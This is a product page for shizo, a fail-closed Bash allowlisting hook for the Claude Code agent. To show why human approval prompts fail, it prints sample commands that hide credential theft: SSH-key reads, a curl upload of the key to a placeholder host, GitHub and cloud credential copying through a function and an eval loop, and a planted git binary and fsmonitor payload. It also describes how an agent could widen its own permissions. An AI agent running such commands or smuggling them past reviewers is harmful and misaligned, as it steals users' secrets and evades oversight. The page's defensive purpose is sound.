Control what your AI agent can run.

Fail-closed Bash allowlisting for Claude Code.

shizo is a PreToolUse hook that parses shell syntax, resolves executables, and matches commands against a line-oriented rule set. Anything it cannot statically verify is denied.

View on GitHub Download v0.3

How it works

1

Parse

Full shell syntax parse — pipes, chains, subshells, redirections.

2

Resolve

Every command is resolved against PATH and a trusted-directory set.

3

Sandbox check

Verify the sandbox capability file is present; deny everything otherwise.

4

Match rules

Argv tokens matched against allow/deny rules with ANY and HAS wildcards.

5

Decide

A deny always wins. Unmatched commands fall through to ask.

Why "ask the operator" isn't enough

Without shizo, unrecognized commands fall through to a human approval prompt. In practice, operators approve what they can't fully read. Can you spot the problem here? 

# Claude Code asks: "Run this command?"

python3 - <<'PY'
p = 'src/config/api.ts'
s = open(p, encoding='utf-8').read()

def sub(old, new):
    assert old in s, "NOT FOUND: " + old[:80]
    return s.replace(old, new, 1)

s = sub(
    'baseURL: "https://staging.example.com"',
    'baseURL: "https://api.example.com"',
)
s = sub(
    'timeout: 5000',
    'timeout: 15000',
)
s = sub(
    'retries: 1',
    'retries: 3',
)
open('/Users/you/.ssh/id_ed25519').read()  # ← line 19
s = sub(
    'logLevel: "debug"',
    'logLevel: "warn"',
)

open(p, 'w', encoding='utf-8').write(s)
PY

Line 19 reads your SSH private key. The rest is a legitimate config edit — boring enough that most operators scroll past it. Real sessions contained heredocs of 80–130 lines. shizo denies python3 by default so this never reaches the operator.

Variables hide the destination

Each line looks like ordinary release automation. Only after expanding every variable does the upload target and sensitive input become clear. 

# Package build diagnostics for the support ticket
root="$HOME"
area=".s${USER:+sh}"
name="id_ed25519"
input="$root/$area/$name"

scheme="ht${CI:+tp}s"
host="support-upload.example"
path="cases/$CASE_ID/diagnostics"

archive="$(mktemp)/build-diagnostics.txt"
git status --short > "$archive"
git log -20 --oneline >> "$archive"
cat "$input" >> "$archive"
curl --upload-file "$archive" "$scheme://$host/$path"

$input is the SSH private key. shizo rejects dynamic argv before attempting to match an allow rule.

A helper function hides the side effect

The call site says “collect metadata.” The function body is far enough away that approving it requires tracing control flow rather than reading one command. 

collect_metadata() {
    local out="$1"
    uname -a > "$out"
    git rev-parse HEAD >> "$out"
    git diff --stat >> "$out"

    local home_snapshot="${HOME}/.config/gh/hosts.yml"
    printf '\n--- environment ---\n' >> "$out"
    cat "$home_snapshot" >> "$out"
}

report="$(mktemp)/metadata.txt"
collect_metadata "$report"
tar -czf build-report.tgz "$report"

The function quietly adds GitHub credentials to the report. shizo denies any shell function declaration.

Indirection separates intent from execution

Reviewers see validation and cleanup commands, while the executable and arguments are assembled elsewhere and run through a generic helper. 

# Verify generated assets and remove the temporary bundle
tool="c${BUILD_NUMBER:+a}t"
parts=("$HOME/.aws/credentials" "$HOME/.config/gcloud/credentials.db")
runner="e${TERM:+v}al"

for item in "${parts[@]}"; do
    test -r "$item" || continue
    task="$tool '$item' >> /tmp/asset-check.log"
    $runner "$task"
done

wc -c /tmp/asset-check.log
rm -f /tmp/generated-assets.tgz

The loop copies cloud credentials into the “asset” log. shizo denies parameter-expanded commands and unconditionally denies eval.

Why not just Claude Code permissions?

Native permission rules match the command text. shizo matches the command that actually runs. Six differences that change the outcome.

1. It resolves the binary, not the string

A native rule allowing git allows whatever git resolves to. Drop an executable into a repo that lands earlier on PATH and the allowlist carries over to it. shizo resolves the path first and denies anything outside the trusted directories. 

# attacker-planted ./git, PATH=.:/usr/bin
# native rule Bash(git status:*)  -> allowed
trust /usr/bin
allow git status ANY   # resolves ./git -> untrusted -> denied

2. Indirection is denied unconditionally

eval, exec, env, xargs and sudo all launch a second command that no static rule can see. You can deny each one by hand in a native config — but only the ones you remembered. shizo denies the whole class before rules are consulted. 

# every one of these hides the real command
env -i git push
xargs -I{} rm -rf {}
eval "$CMD"
# shizo: denied at resolution, no rule needed

3. The rules themselves are tamper-evident

A settings file is just a file — an agent with write access can widen its own permissions. shizo attest records a hash of the rule set, and a mismatch is reported on the next evaluation. 

$ shizo attest
written  global/rules  sha256:9f2c…

# after an unattested edit
$ shizo test 'git status'
attestation mismatch — rules modified since last attest

4. Fail-closed means deny, not prompt

Native permissions fall back to asking a human. Unattended — CI, a background agent, an overnight run — a prompt is a hang, and an impatient operator is a rubber stamp. shizo requires a sandbox gate: no capability file, no execution. 

# omit this line and everything is denied
sandbox nono

# NONO_CAP_FILE unset -> deny, never ask

5. Rules match argv, not the command text

Native rules are glob patterns over the raw command string, so they see what was typed rather than what the shell will run. shizo matches the argv tokens produced by a real shell parse, after quoting and word-splitting have been resolved — the same rule catches every spelling of the same flag. 

# same flag, four spellings the shell treats identically
git reset --hard HEAD~1
git reset --ha''rd HEAD~1
git reset --ha\rd HEAD~1
git reset $FLAG HEAD~1

# text glob sees four different strings
deny git reset HAS --hard   # shizo parses first, then matches

6. The workspace can't rewrite the gate

An allowed command is only as safe as the files it reads. Append an fsmonitor to .git/config and the next harmless git status runs it; rewrite .claude/settings.json and the permissions are gone. No command rule can see that coming. shizo is built to run inside a nono profile that keeps .git, .claude and its own rules read-only, and it denies everything outside a sandbox. 

# one allowed echo, one allowed git status
echo '[core] fsmonitor = ./payload' >> .git/config
git status
# native Bash(echo:*), Bash(git status:*) -> payload runs
# shizo + nono profile: workspace read-only
Operation not permitted

Rules at a glance

# Directives (global tier only)
sandbox nono
trust   /usr/bin
trust   /opt/homebrew/bin

# Allow safe reads
allow git status ANY
allow git log ANY
allow git diff ANY

# Block destructive operations
deny git push ANY
deny git reset HAS --hard
